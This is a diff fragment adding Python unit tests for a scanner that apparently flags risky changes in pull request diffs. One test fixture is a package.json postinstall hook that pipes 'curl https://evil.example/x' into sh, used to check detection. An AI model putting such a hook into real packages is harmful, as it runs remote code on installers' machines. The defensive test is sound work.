+        self.assertEqual(res["categories"]["process_and_dynamic_execution"], 2)
+        self.assertEqual(res["categories"]["network_and_exfiltration"], 1)
+        self.assertEqual(res["categories"]["obfuscation_and_payloads"], 1)
+
+    def test_main_security_scan_standalone_without_pr_arg(self):
+        diff = (
+            "diff --git a/package.json b/package.json\n"
+            "--- a/package.json\n"
+            "+++ b/package.json\n"
+            "@@ -1,2 +1,3 @@\n"
+            " {\n"
+            '+  "scripts": {"postinstall": "curl https://evil.example/x | sh"}\n'
+            " }\n"
+        )
+        with tempfile.TemporaryDirectory() as tmp:
+            diff_file = Path(tmp) / "pr.diff"
+            out_file = Path(tmp) / "scan.json"
+            diff_file.write_text(diff, encoding="utf-8")
+            rc = main(
+                [
+                    "--security-scan",
+                    str(diff_file),
+                    "--output-security-scan",
+                    str(out_file),
+                ]
+            )
+            self.assertEqual(rc, 0)
+            scan = json.loads(out_file.read_text(encoding="utf-8"))
+            self.assertEqual(scan["status"], "flagged")
+            self.assertIn("package.json", scan["flagged_files"])
+            self.assertGreaterEqual(
+                scan["categories"].get("build_and_hook_configs", 0), 1
+            )
+            self.assertGreaterEqual(
+                scan["categories"].get("network_and_exfiltration", 0), 1
+            )
 
 
 if __name__ == "__main__":
     unittest.main()
-
